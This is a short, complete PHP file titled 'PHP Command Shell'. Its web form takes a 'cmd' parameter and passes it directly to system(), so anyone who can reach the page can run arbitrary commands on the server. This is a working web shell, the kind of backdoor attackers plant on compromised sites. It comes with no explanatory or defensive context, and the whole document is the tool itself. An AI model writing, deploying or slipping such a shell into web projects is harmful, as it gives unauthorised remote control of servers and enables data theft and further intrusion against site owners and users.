<!DOCTYPE html>
<html>
<head>
  <title>PHP Shell</title>
</head>
<body>
  <h2>PHP Command Shell</h2>
  <form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" />
    <input type="submit" value="Execute" />
  </form>
  <pre>
<?php
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
  </pre>
</body>
</html>
